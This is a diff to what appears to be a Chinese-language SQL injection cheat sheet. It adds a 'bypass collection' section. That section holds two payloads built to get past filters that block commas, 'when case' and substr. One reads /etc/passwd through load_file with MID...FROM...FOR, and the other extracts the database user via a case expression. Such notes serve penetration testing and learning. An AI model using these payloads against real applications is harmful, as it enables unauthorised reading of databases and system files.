@@ -916,3 +916,12 @@ select--\r\n* from--\r\npg_database;
 | **`@@port`**           | 服务器监听的端口（默认 3306）。           |
 | **`connection_id()`**  | 返回当前连接的线程 ID。                   |
 | **`last_insert_id()`** | 返回最近一次 `INSERT` 操作产生的自增 ID。 |
+
+#### 绕过整理
+
+```txt
+# 不允许使用逗号、when case、substr
+0"%2bcase+when(MID((load_file/*!*/("/etc/passwd"))+FROM+1+FOR+4))like"root%"then+"1"+else+"0"+end%2b"0
+1"+case when'1'then ascii(MID(user() FROM 1 FOR 1)) else "3" end+"4
+```
+
